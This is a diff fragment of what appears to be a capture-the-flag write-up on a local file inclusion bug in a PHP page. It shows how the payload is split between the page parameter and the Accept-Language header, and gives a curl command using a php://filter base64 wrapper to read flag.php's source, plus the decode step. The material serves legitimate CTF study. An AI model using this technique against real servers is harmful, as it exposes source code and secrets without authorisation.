@@ -13,7 +13,7 @@ Trying to follow ctf or tokyo, the browser makes a GET request to a php as param
 Mh! Warning: include() => suggest with high probability a **LFI** attack.
 Before continue one consideration: the include function try to open a file in the page parameter directory with the language specified in the Accept-Language Header Request.
 
-Every LFI page parameter results in a correctly input sanity check(escape . and /).
+Every LFI to the page parameter results in a correctly input sanity check(escape . and /).
 
 What can we do? Attach a LFI in the Accept-Language and build the properly LFI.
 
@@ -78,7 +78,7 @@ else {
 _include "flag.php"_, so one more time LFI:
 `pirate$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"` => result in the GET Request `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=flag.php`.
 
-Decode base64 and woitlà:
+Decode base64 et woitlà:
 
 ```
 pirate$ echo "PD9waHAKJGZsYWcgPSAiVFdDVEZ7SV9mb3VuZF9zaW1wbGVfTEZJfSI7Cg" | base64 -D -
